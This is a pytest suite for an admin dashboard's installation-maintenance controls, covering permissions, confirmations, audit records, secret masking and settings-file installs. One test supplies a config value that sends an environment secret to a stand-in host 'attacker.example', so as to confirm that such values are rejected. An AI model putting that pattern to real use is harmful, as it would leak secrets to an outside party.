"""Settings > Maintenance installation controls, the full setup guide and the
workspace recovery switch-off note: permissions (global admin only, a
workspace admin is refused), confirmations, activity-record rows, bounded
inputs, the kernel work each control runs, and plain rendered wording."""
from __future__ import annotations

import hashlib
import html as _html
import re
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

ORIGIN = {"Origin": "http://127.0.0.1"}
BASE = "/api/v1/admin/installation"
_BANNED = re.compile(
    r"\b(tenant|principal|payload|endpoint|schema|uuid|sha-?256|digest|json|revision|"
    r"idempoten\w*|lease|toml|yaml|stdout|traceback|kek|dsn|rls|protoc|stubs?|canary)\b|/api/v1|"
    r"HTTP \d{3}|maverick |MAVERICK_|config\.toml",
    re.IGNORECASE,
)


def visible_text(page: str) -> str:
    main = page.split('<main id="content"', 1)[-1].split("</main>", 1)[0]
    main = re.sub(r"<(script|style)\b.*?</\1>", " ", main, flags=re.DOTALL)
    main = re.sub(r"<[^>]+>", " ", main)
    return _html.unescape(re.sub(r"\s+", " ", main))


@pytest.fixture
def client(monkeypatch, tmp_path):
    from maverick import config, world_model
    from maverick.audit import writer as audit_writer
    from maverick_dashboard import app as dash_app
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path / "mh"))
    monkeypatch.setenv("MAVERICK_CONFIG", str(tmp_path / "config.toml"))
    monkeypatch.setenv("MAVERICK_ENCRYPT_AT_REST", "0")
    monkeypatch.setattr(world_model, "DEFAULT_DB", tmp_path / "world.db")
    monkeypatch.setattr(audit_writer, "_default", None)
    audit_writer._defaults.clear()
    for name in ("MAVERICK_DASHBOARD_TOKEN", "MAVERICK_TENANT", "MAVERICK_CLIENT_ID", "MAVERICK_PG_DSN",
                 "MAVERICK_ENCRYPTION_KEY", "MAVERICK_CONFIG_OVERLAY"):
        monkeypatch.delenv(name, raising=False)
    import maverick.runtime_overrides as ro
    monkeypatch.setattr(ro, "OVERRIDES_PATH", tmp_path / "runtime-overrides.toml")
    config.reset_config_cache()
    dash_app._world_cache.clear()
    yield TestClient(dash_app.app, base_url="http://127.0.0.1", headers=ORIGIN)
    config.reset_config_cache()
    dash_app._world_cache.clear()
    audit_writer._defaults.clear()


def _as(monkeypatch, role: str, who: str = "user:someone"):
    from maverick_dashboard import auth, rbac
    rbac.set_role(who, role)
    monkeypatch.setattr(auth, "caller_principal", lambda request: who)


def _workspace_admin(monkeypatch, who: str = "user:wanda"):
    """A person who administers a workspace but holds no installation role."""
    from maverick_dashboard import auth
    _as(monkeypatch, "viewer", who)
    monkeypatch.setattr(auth, "role_for_principal", lambda principal: "admin")


def _audit_verbs(monkeypatch):
    from maverick.audit import writer
    seen: list[dict] = []
    real = writer.audit_event

    def spy(kind, **payload):
        seen.append(payload)
        return real(kind, **payload)
    monkeypatch.setattr(writer, "audit_event", spy)
    import maverick.audit as audit_pkg
    monkeypatch.setattr(audit_pkg, "audit_event", spy)
    return seen


def _config(tmp_path, text: str):
    from maverick import config
    (tmp_path / "config.toml").write_text(text, encoding="utf-8")
    config.reset_config_cache()


READS = ["/versions", "/key-fingerprint", "/database-separation", "/database-updates", "/local-models",
         "/settings-file", "/configuration", "/release-checks", "/learning-move", "/task-records",
         "/jobs/abc"]
WRITES = [("/release-check", {}), ("/settings-file/update", {"confirm": True}),
          ("/message-receipts/tidy", {"confirm": True}), ("/release-checks/baseline", {"confirm": True}),
          ("/connection-components", {"confirm": True}),
          ("/older-records/preview", {"workspace": "acme"}),
          ("/older-records/assign", {"workspace": "acme", "confirm": True}),
          ("/learning-move", {"confirm": True}), ("/task-records/schedule", {"workspace": "acme", "confirm": True}),
          ("/task-records/cancel", {"confirm": True})]


@pytest.mark.parametrize("who", ["operator", "workspace admin"])
def test_every_control_needs_an_installation_administrator(client, monkeypatch, who):
    if who == "operator":
        _as(monkeypatch, "operator")
    else:
        _workspace_admin(monkeypatch)
    for path in READS:
        assert client.get(BASE + path).status_code == 403, path
    assert client.get(BASE + "/release-checks/compare?baseline=x").status_code == 403
    for path, body in WRITES:
        assert client.post(BASE + path, json=body).status_code == 403, path
    assert client.get("/start/setup").status_code == 403
    assert client.post("/api/v1/setup/settings-file/check", content=b"[a]").status_code == 403


def test_changes_are_refused_from_another_site(client, monkeypatch):
    bare = TestClient(client.app, base_url="http://127.0.0.1")
    for path, body in WRITES:
        assert bare.post(BASE + path, json=body).status_code == 403, path


def test_versions_come_from_the_installed_packages_in_plain_words(client):
    data = client.get(BASE + "/versions").json()
    from maverick.installation_info import package_versions
    core = dict(package_versions())["maverick-agent"]
    assert data["summary"].startswith(f"Lightwork {core}")
    assert [p["name"] for p in data["parts"]][:2] == ["Lightwork core", "Safety screening"]
    assert {d["label"] for d in data["details"]} >= {"Records database version", "Python", "Operating system"}
    assert not _BANNED.search(data["summary"])


def test_dashboard_cannot_install_environment_references(client, monkeypatch):
    monkeypatch.setenv("PROCESS_SECRET", "never-expose-this")
    raw = b'[knowledge]\nbase_url = "https://attacker.example/${PROCESS_SECRET}"\n'
    response = client.post("/api/v1/setup/settings-file/check", content=raw)
    assert response.status_code == 200
    assert response.json()["valid"] is False
    assert "never-expose-this" not in response.text


def test_key_fingerprint_is_shown_never_the_key(client, monkeypatch):
    missing = client.get(BASE + "/key-fingerprint").json()
    assert missing["available"] is False and "no fingerprint" in missing["summary"]
    key = bytes(range(32))
    monkeypatch.setenv("MAVERICK_ENCRYPTION_KEY", key.hex())
    shown = client.get(BASE + "/key-fingerprint")
    assert shown.json()["fingerprint"] == "sha256:" + hashlib.sha256(key).hexdigest()
    assert key.hex() not in shown.text


def test_release_parts_check_runs_every_packaged_check(client, monkeypatch):
    from maverick import release_runtime
    calls = []
    monkeypatch.setattr(release_runtime, "verify_full_release_runtime", lambda: calls.append(1) or 160004)
    ok = client.post(BASE + "/release-check").json()
    assert calls and ok["ready"] is True and "16.4" in ok["technical"][0]["text"]

    def broken():
        raise RuntimeError("document parser missing")
    monkeypatch.setattr(release_runtime, "verify_full_release_runtime", broken)
    bad = client.post(BASE + "/release-check").json()
    assert bad["ready"] is False and "document parser missing" in bad["technical"][0]["text"]
    assert not _BANNED.search(bad["summary"])


def test_database_checks_on_a_computer_without_a_shared_database(client):
    separation = client.get(BASE + "/database-separation").json()
    assert separation["shared_database"] is False and "nothing to check" in separation["summary"]
    updates = client.get(BASE + "/database-updates").json()
    assert updates["ok"] is True and updates["pending"] == 0 and "up to date" in updates["summary"]
    preview = client.post(BASE + "/older-records/preview", json={"workspace": "acme"})
    assert preview.status_code == 404  # not a listed workspace
    from maverick.tenant.registry import create_tenant
    create_tenant("acme", display_name="Acme")
    refused = client.post(BASE + "/older-records/preview", json={"workspace": "acme"})
    assert refused.status_code == 409 and "nothing to check" in refused.json()["detail"]
    assert client.post(BASE + "/older-records/preview", json={"workspace": "bad id!"}).status_code == 422
    assert client.post(BASE + "/older-records/assign", json={"workspace": "acme"}).status_code == 409


def test_local_model_plan_explains_missing_setup(client, tmp_path):
    data = client.get(BASE + "/local-models").json()
    assert data["planned"] is False and "All settings" in data["summary"]
    _config(tmp_path, '[local_runtime]\nengine = "vllm"\nmodel = "acme/small"\n')
    planned = client.get(BASE + "/local-models").json()
    assert planned["planned"] is True and planned["enabled"] is False
    assert {"label": "Model", "value": "acme/small"} in planned["facts"]
    assert any("vllm" in row["text"] for row in planned["technical"])


def test_settings_file_update_previews_then_needs_confirmation_and_is_recorded(client, monkeypatch, tmp_path):
    none = client.get(BASE + "/settings-file").json()
    assert "built-in settings" in none["summary"]
    _config(tmp_path, "[budgets]\nmax = 1\n")
    preview = client.get(BASE + "/settings-file").json()
    assert preview["unused_sections"] == 1 and preview["can_update"] is False
    assert "does not use" in preview["summary"] and "budget" in preview["technical"][0]["text"]
    assert client.post(BASE + "/settings-file/update", json={"confirm": False}).status_code == 409
    assert client.post(BASE + "/settings-file/update", json={}).status_code == 422
    seen = _audit_verbs(monkeypatch)
    done = client.post(BASE + "/settings-file/update", json={"confirm": True}).json()
    assert done["wrote"] is False and done["backup"] == ""
    assert any(p.get("verb") == "settings_file_update" and p.get("actor") for p in seen)


def test_whole_configuration_shows_sources_links_and_hides_secrets(client, monkeypatch, tmp_path):
    empty = client.get(BASE + "/configuration").json()
    assert empty["count"] == 0 and "built-in settings" in empty["summary"]
    monkeypatch.setenv("LW_TEST_ALERT_URL", "https://alerts.example")
    _config(tmp_path, '[safety]\nprofile = "strict"\n[providers.anthropic]\napi_key = "sk-test-not-real"\n'  # pragma: allowlist secret
                      '[grpc]\nport = 50051\n[notifications]\nurl = "${LW_TEST_ALERT_URL}"\n')
    response = client.get(BASE + "/configuration")
    assert "sk-test-not-real" not in response.text
    rows = {r["setting"] + "|" + r["where"]: r for s in response.json()["sections"] for r in s["keys"]}
    secret = next(r for r in rows.values() if r["where"] == "Providers anthropic")
    assert secret["secret"] is True and secret["value"] == "Set"
    assert secret["href"] == "/settings#settings-integrations"
    safety = next(r for k, r in rows.items() if k.endswith("|Safety") and r["value"] == "strict")
    assert safety["href"].startswith("/settings/all#group-") and safety["source"] == "Installation settings file"
    grpc = next(r for r in rows.values() if r["where"] == "Grpc")
    assert grpc["value"] == "50051"
    alert = next(r for r in rows.values() if r["where"] == "Notifications")
    assert alert["source"] == "Set on the server"


# Keys that gained rows in All settings (or their own page) when the settings
# packages merged link there; the rest say why they stay in the settings file.
_LINKED = {
    "grpc.max_workers": "/settings/all#group-", "logging.level": "/settings/all#group-",
    "observability.prometheus_port": "/settings/all#group-", "queue.backend": "/settings/all#group-",
    "embedded.allow_flash": "/settings/all#group-", "release.publisher_pubkeys": "/settings/all#group-",
    "world_model.dsn": "/settings/all#group-", "lsp.servers": "/settings/all#group-",
    "ai_bank_mrm.enable": "/settings/all#group-modules",
    "rehearsal.enable": "/settings/all#group-safety",
    "threat_hunt.enable": "/security", "oauth.vault": "/connections",
    "security_ops.enable": "/security", "mcp_servers.x": "/mcp",
}
_FILE_ONLY = {
    "langchain.tracing": "developer tool", "client.id": "Fixed when Lightwork is installed",
    "ai_bank_mrm.model_tiers": "on/off switch is in All settings", "director.mode": "Not yet changeable",
    "director.signal_cli_path": "file, program or variable",
}


def test_whole_configuration_links_every_key_that_has_a_row_and_explains_the_rest(client, tmp_path):
    from maverick_dashboard.installation_ops_api import _catalog_index, _switch_index, _target
    exact, tables = _catalog_index()
    index = (exact, tables, *_switch_index())
    for path, href in _LINKED.items():
        target, reason = _target(path, path.split(".")[0], index)
        assert target is not None and target[0].startswith(href), (path, target, reason)
    for path, words in _FILE_ONLY.items():
        target, reason = _target(path, path.split(".")[0], index)
        assert target is None and words in reason, (path, target, reason)
    from maverick_dashboard import settings_catalog
    for setting in settings_catalog.SETTINGS:  # every catalog row is reachable from this view
        if setting.key_kind == "key":
            path = ".".join(setting.path)
            assert _target(path, setting.top, index)[0] is not None, path
    _config(tmp_path, '[grpc]\nmax_workers = 8\n[langchain]\ntracing = true\n')
    rows = [r for s in client.get(BASE + "/configuration").json()["sections"] for r in s["keys"]]
    grpc = next(r for r in rows if r["where"] == "Grpc")
    assert grpc["href"].startswith("/settings/all#group-") and grpc["reason"] == ""
    lang = next(r for r in rows if r["where"] == "Langchain")
    assert lang["href"] == "" and "developer tool" in lang["reason"]


def test_every_workspace_clean_up_previews_then_runs_as_one_recorded_job(client, monkeypatch):
    from maverick import records_gc
    from maverick.tenant.registry import create_tenant
    from maverick_dashboard import ops_admin_jobs
    single = client.get(BASE + "/all-workspaces-cleanup").json()
    assert single["workspaces"] == [] and "single workspace" in single["summary"]
    assert client.post(BASE + "/all-workspaces-cleanup",
                       json={"days": 90, "activity_days": 30, "confirm": True}).status_code == 409
    create_tenant("acme", display_name="Acme")
    create_tenant("beta", display_name="Beta")
    import time as _time

    from maverick.paths import tenant_scope
    from maverick.world_model import close_world_if_owned, open_world
    with tenant_scope(tenant="acme"):
        world = open_world()
        goal = world.create_goal("old work")
        world.append_event(goal, "planner", "note", "step")
        with world._writing() as conn:
            conn.execute("UPDATE goal_events SET ts = ?", (_time.time() - 400 * 86400,))
        close_world_if_owned(world)
    assert client.get(BASE + "/all-workspaces-cleanup", params={"days": 5}).status_code == 422
    preview = client.get(BASE + "/all-workspaces-cleanup", params={"days": 90, "activity_days": 30}).json()
    rows = {r["workspace"]: r for r in preview["workspaces"]}
    assert rows["Acme"]["activity"] == 1 and rows["Beta"]["empty"] is True
    assert "1 activity entry would be removed" in preview["summary"]
    assert client.post(BASE + "/all-workspaces-cleanup",
                       json={"days": 90, "activity_days": 30}).status_code == 409
    calls = []
    real = records_gc.prune_world
    monkeypatch.setattr(records_gc, "prune_world",
                        lambda world, **kw: calls.append(kw) or real(world, **kw))
    seen = _audit_verbs(monkeypatch)
    job = client.post(BASE + "/all-workspaces-cleanup",
                      json={"days": 90, "activity_days": 30, "confirm": True}).json()["job"]
    done = ops_admin_jobs.wait(job["id"])
    assert done["state"] == "done" and done["result"]["activity"] == 1
    assert calls == [{"days": 90, "events_days": 30}] * 2
    records = [p for p in seen if p.get("verb") == "records_cleanup_all_workspaces"]
    assert len(records) == 1 and records[0]["workspaces"] == 2 and records[0]["activity"] == 1
    assert 'data-ops-run="cleanup-all"' in client.get("/settings").text


def test_every_workspace_clean_up_is_for_installation_administrators(client, monkeypatch):
    _workspace_admin(monkeypatch)
    assert client.get(BASE + "/all-workspaces-cleanup").status_code == 403
    assert client.post(BASE + "/all-workspaces-cleanup",
                       json={"days": 90, "activity_days": 30, "confirm": True}).status_code == 403


def test_message_receipt_tidy_needs_confirmation_and_is_recorded(client, monkeypatch):
    assert client.post(BASE + "/message-receipts/tidy", json={"confirm": False}).status_code == 409
    from maverick_channels import delivery
    calls = []
    monkeypatch.setattr(delivery.DeliveryJournal, "compact_delivered",
                        lambda self, *, limit=100: calls.append(limit) or 3)
    seen = _audit_verbs(monkeypatch)
    data = client.post(BASE + "/message-receipts/tidy", json={"confirm": True}).json()
    assert calls == [100] and data["cleared"] == 3 and "3 delivered messages" in data["summary"]
    assert any(p.get("verb") == "message_receipts_tidy" and p.get("cleared") == 3 for p in seen)


def _finished_tasks(count: int, cost: float, seconds: float = 5.0, outcome: str = "success"):
    import time as _time

    from maverick_dashboard._shared import _world
    world = _world()
    for i in range(count):
        goal = world.create_goal(f"task {i}")
        episode = world.start_episode(goal)
        with world._writing() as conn:
            conn.execute("UPDATE episodes SET started_at = ? WHERE id = ?", (_time.time() - seconds, episode))
        world.end_episode(episode, "done", outcome, cost_dollars=cost, input_tokens=100, output_tokens=50)


def test_release_checks_record_a_baseline_and_compare_plainly(client, monkeypatch):
    assert client.post(BASE + "/release-checks/baseline", json={"confirm": True}).status_code == 409
    _finished_tasks(3, 0.10)
    assert client.post(BASE + "/release-checks/baseline", json={"confirm": False}).status_code == 409
    seen = _audit_verbs(monkeypatch)
    recorded = client.post(BASE + "/release-checks/baseline", json={"confirm": True}).json()
    assert any(p.get("verb") == "release_baseline_recorded" for p in seen)
    listing = client.get(BASE + "/release-checks").json()
    assert listing["releases"] == [recorded["release"]] and listing["measured"] is True
    same = client.get(BASE + "/release-checks/compare", params={"baseline": recorded["release"]}).json()
    assert same["passed"] is True and {r["measure"] for r in same["rows"]} >= {"Cost per task"}
    _finished_tasks(3, 1.00)  # the average cost per task rises sharply
    worse = client.get(BASE + "/release-checks/compare", params={"baseline": recorded["release"]}).json()
    assert worse["passed"] is False and "got worse" in worse["summary"]
    assert any(r["measure"] == "Cost per task" and r["result"] == "Got worse" for r in worse["rows"])
    assert client.get(BASE + "/release-checks/compare", params={"baseline": "nope"}).status_code == 404
    bad = client.get(BASE + "/release-checks/compare", params={"baseline": recorded["release"], "tolerance": 0.5})
    assert bad.status_code == 422


def test_connection_components_run_as_a_job_and_refuse_read_only_installs(client, monkeypatch):
    from maverick import grpc_stubs
    from maverick_dashboard import installation_ops_api
    from maverick_dashboard import ops_admin_jobs as ops_jobs
    assert client.post(BASE + "/connection-components", json={"confirm": False}).status_code == 409
    monkeypatch.setattr(installation_ops_api, "_components_writable", lambda: False)
    refused = client.post(BASE + "/connection-components", json={"confirm": True})
    assert refused.status_code == 409 and "read-only" in refused.json()["detail"]
    monkeypatch.setattr(installation_ops_api, "_components_writable", lambda: True)
    monkeypatch.setattr(grpc_stubs, "generate_all", lambda: ["maverick.proto", "federation.proto"])
    seen = _audit_verbs(monkeypatch)
    job = client.post(BASE + "/connection-components", json={"confirm": True}).json()["job"]
    finished = ops_jobs.wait(job["id"])
    assert finished["state"] == "done"
    status = client.get(BASE + "/jobs/" + job["id"]).json()["job"]
    assert status["result"]["prepared"] == ["Task connection", "Connection between installations"]
    assert any(p.get("verb") == "connection_components_prepared" for p in seen)
    assert client.get(BASE + "/jobs/unknown").status_code == 404


def test_learning_move_needs_the_shared_store_and_confirmation(client, monkeypatch, tmp_path):
    state = client.get(BASE + "/learning-move").json()
    assert state["ready"] is False and "All settings" in state["summary"]
    assert client.post(BASE + "/learning-move", json={"confirm": False}).status_code == 409
    refused = client.post(BASE + "/learning-move", json={"confirm": True})
    assert refused.status_code == 409 and not _BANNED.search(refused.json()["detail"])
    _config(tmp_path, '[self_harness]\nstore = "world"\n')
    assert client.get(BASE + "/learning-move").json()["ready"] is True
    seen = _audit_verbs(monkeypatch)
    moved = client.post(BASE + "/learning-move", json={"confirm": True}).json()
    assert moved["moved"] == 0 and "needed moving" in moved["summary"]
    assert any(p.get("verb") == "learning_move" for p in seen)


def test_task_record_move_is_scheduled_for_the_next_start(client, monkeypatch, tmp_path):
    from maverick.tenant.registry import create_tenant
    from maverick_dashboard import offline_maintenance
    create_tenant("acme", display_name="Acme")
    state = client.get(BASE + "/task-records").json()
    assert state["shared_database"] is False and state["scheduled"] is None
    refused = client.post(BASE + "/task-records/schedule", json={"workspace": "acme", "confirm": True})
    assert refused.status_code == 409 and "Nothing was scheduled" in refused.json()["detail"]
    monkeypatch.setattr(offline_maintenance, "task_records_ready", lambda workspace: None)
    assert client.post(BASE + "/task-records/schedule", json={"workspace": "acme"}).status_code == 409
    seen = _audit_verbs(monkeypatch)
    scheduled = client.post(BASE + "/task-records/schedule", json={"workspace": "acme", "confirm": True}).json()
    assert scheduled["scheduled"]["workspace"] == "acme"
    assert any(p.get("verb") == "task_records_move_scheduled" for p in seen)

    from maverick import a2a_migration
    moved = []
    monkeypatch.setattr(a2a_migration, "migrate_local_tasks",
                        lambda tenant: moved.append(tenant) or {"status": "complete", "source_claims": 4,
                                                                "authority_id": "a", "archive": "x"})
    offline_maintenance.run_scheduled()
    assert moved == ["acme"]
    after = client.get(BASE + "/task-records").json()
    assert after["scheduled"] is None and after["last_result"]["state"] == "done"
    assert "Moved 4 task records" in after["last_result"]["summary"]
    assert any(p.get("verb") == "task_records_move" and p.get("ok") is True for p in seen)


def test_a_failed_offline_move_is_recorded_and_never_blocks_start(client, monkeypatch):
    from maverick import a2a_migration
    from maverick_dashboard import offline_maintenance
    offline_maintenance.schedule("task_records", "acme", "user:ada")

    def refuse(tenant):
        raise ValueError("local A2A source ledger and completed migration binding are missing")
    monkeypatch.setattr(a2a_migration, "migrate_local_tasks", refuse)
    offline_maintenance.run_scheduled()
    state = offline_maintenance.task_records_state()
    assert state["scheduled"] is None and state["last_result"]["state"] == "failed"
    assert "originals were kept" in state["last_result"]["summary"]
    assert client.post(BASE + "/task-records/cancel", json={"confirm": True}).json()["scheduled"] is None


def test_settings_page_carries_the_maintenance_controls_in_plain_words(client):
    page = client.get("/settings")
    assert page.status_code == 200
    for name in ("services", "version", "release", "canary-baseline", "setup", "config", "settings-file",
                 "database-updates", "separation", "learning", "receipts", "components", "fingerprint",
                 "local-models"):
        assert f'data-ops-run="{name}"' in page.text, name
    assert "/static/lightwork-maintenance-ops.js" in page.text
    ops = page.text.split('data-ops="services"', 1)[1]
    text = visible_text('<main id="content">' + ops.split("<script", 1)[0] + "</main>")
    assert "Lightwork's services" in page.text and not _BANNED.search(text)
    assert client.get("/static/lightwork-maintenance-ops.js").status_code == 200


def test_setup_guide_lists_every_assistant_step(client):
    from maverick_dashboard.setup_guide import STEPS, steps
    from maverick_installer import wizard
    assert [s[0] for s in STEPS] == [s[0] for s in wizard.STEPS]
    rows = steps()
    assert all(r["in_app"] for r in rows if r["id"] != "deployment")
    page = client.get("/start/setup")
    assert page.status_code == 200
    text = visible_text(page.text)
    assert "Full setup guide" in text and "Install a prepared settings file" in text
    assert not _BANNED.search(text)
    assert 'href="/start/setup"' in client.get("/start").text


def test_monitoring_step_link_reaches_every_setting_it_names(client):
    from maverick_dashboard import settings_catalog
    from maverick_dashboard.setup_guide import steps
    row = next(r for r in steps() if r["id"] == "monitoring")
    # The step's settings sit in two groups (Performance and Security), so its link is the
    # page that lists every group, not one group's anchor.
    assert row["in_app"] and row["href"] == "/settings/all"
    assert client.get(row["href"]).status_code == 200
    for setting_id in ("observability.otel_endpoint", "kms.key_id", "audit.siem_dest"):
        found = client.get(row["href"], params={"id": setting_id})
        assert found.status_code == 200
        assert settings_catalog.BY_ID[setting_id].label in visible_text(found.text), setting_id


def test_prepared_settings_file_is_checked_then_installed_with_a_backup(client, monkeypatch, tmp_path):
    bad = client.post("/api/v1/setup/settings-file/check", content=b"[safety\n").json()
    assert bad["valid"] is False and not _BANNED.search(bad["summary"])
    for unusable in (b'[budgets]\nx = 1\n', b'[budget]\nmax_dollars = "unlimited"\n'):
        refused = client.post("/api/v1/setup/settings-file/check", content=unusable).json()
        assert refused["valid"] is False and "review" not in refused
        assert "cannot use" in refused["summary"]
    good = b'[safety]\nprofile = "strict"\n'
    checked = client.post("/api/v1/setup/settings-file/check", content=good).json()
    assert checked["valid"] is True and checked["problems"] == 0
    assert client.post("/api/v1/setup/settings-file/install", content=good).status_code == 409
    assert client.post("/api/v1/setup/settings-file/check", content=b"x" * (256 * 1024 + 1)).status_code == 413
    _config(tmp_path, '[safety]\nprofile = "balanced"\n')
    # A configuration change invalidates the earlier exact-file review.
    stale = client.post("/api/v1/setup/settings-file/install", params={
        "confirm": True, "review": checked["review"],
    }, content=good)
    assert stale.status_code == 409
    checked = client.post("/api/v1/setup/settings-file/check", content=good).json()
    seen = _audit_verbs(monkeypatch)
    install = {"confirm": True, "review": checked["review"]}
    response = client.post("/api/v1/setup/settings-file/install", params=install, content=good)
    assert response.status_code == 200, response.text
    done = response.json()
    assert done["installed"] is True and "backup" in done["summary"]
    assert (tmp_path / "config.toml").read_bytes() == good
    backups = list(tmp_path.glob("config.toml.bak-*"))
    assert len(backups) == 1 and b"balanced" in backups[0].read_bytes()
    assert [p["verb"] for p in seen if str(p.get("verb", "")).startswith("settings_file_install_")] == [
        "settings_file_install_requested", "settings_file_install_confirmed",
    ]
    assert done["audit_pending"] is False
    replay = client.post("/api/v1/setup/settings-file/install", params=install, content=good).json()
    assert replay["installed"] is True and replay["review"] == checked["review"]
    assert len(list(tmp_path.glob("config.toml.bak-*"))) == 1
    checked = client.post("/api/v1/setup/settings-file/check", content=good).json()
    again = client.post("/api/v1/setup/settings-file/install", params={
        "confirm": True, "review": checked["review"],
    }, content=good).json()
    assert again["installed"] is False


def test_workspace_recovery_page_explains_when_it_is_switched_off(client, tmp_path):
    page = client.get("/workspace/recovery")
    assert page.status_code == 200
    assert "Workspace recovery is turned off." in page.text and 'href="/settings#settings-controls"' in page.text
    _config(tmp_path, "[features]\nworkspace_recovery = true\n")
    assert "Workspace recovery is turned off." not in client.get("/workspace/recovery").text


def test_a_failing_change_still_leaves_the_request_in_the_activity_record(client, monkeypatch, tmp_path):
    """Each change is recorded as requested before it runs, so a change that
    fails part way still shows who asked for it; the outcome follows."""
    from maverick import learning_store_migration as lsm
    from maverick import migrate as migrate_mod
    from maverick_channels import delivery
    from maverick_dashboard import installation_ops_api as ops
    from maverick_dashboard import offline_maintenance

    def boom(*args, **kwargs):
        raise RuntimeError("side effect failed")

    seen = _audit_verbs(monkeypatch)
    monkeypatch.setattr(migrate_mod, "migrate", boom)
    with pytest.raises(RuntimeError):
        client.post(BASE + "/settings-file/update", json={"confirm": True})
    monkeypatch.setattr(delivery.DeliveryJournal, "compact_delivered", boom)
    assert client.post(BASE + "/message-receipts/tidy", json={"confirm": True}).status_code == 409

    def refused():
        raise lsm.MigrationRefused("verification failed")
    monkeypatch.setattr(ops, "_learning_move", refused)
    assert client.post(BASE + "/learning-move", json={"confirm": True}).status_code == 409
    monkeypatch.setattr(offline_maintenance, "cancel", boom)
    with pytest.raises(RuntimeError):
        client.post(BASE + "/task-records/cancel", json={"confirm": True})
    verbs = [p.get("verb") for p in seen]
    pairs = {"settings_file_update_requested": "settings_file_update",
             "message_receipts_tidy_requested": "message_receipts_tidy",
             "learning_move_requested": "learning_move",
             "task_records_move_cancel_requested": "task_records_move_cancelled"}
    failed = [p.get("verb") for p in seen if p.get("succeeded") is False]
    for requested, outcome in pairs.items():
        assert requested in verbs, requested
        assert outcome in failed and verbs.index(requested) < verbs.index(outcome), outcome


def test_a_workspace_under_a_legal_hold_is_shown_as_held_not_as_a_clean_zero(monkeypatch):
    from maverick import records_gc
    from maverick_dashboard import installation_ops_api as ops

    monkeypatch.setattr(ops, "_roster", lambda: [SimpleNamespace(id="ws-a", display_name="Acme"),
                                                 SimpleNamespace(id="ws-b", display_name="Beta")])
    monkeypatch.setattr(records_gc, "sweep_workspaces", lambda tenants, **kwargs: [
        {"workspace": "ws-a", "name": "Acme", "empty": False, "held": True,
         "conversations": 0, "activity": 0},
        {"workspace": "ws-b", "name": "Beta", "empty": False, "conversations": 2, "activity": 1},
    ])
    preview = ops._sweep_preview(90, 30)
    rows = {row["workspace"]: row for row in preview["workspaces"]}
    assert rows["Acme"]["held"] is True and rows["Beta"]["held"] is False
    assert "1 workspace skipped: a legal hold applies there" in preview["summary"]
    assert "1 activity entry would be removed" in preview["summary"]
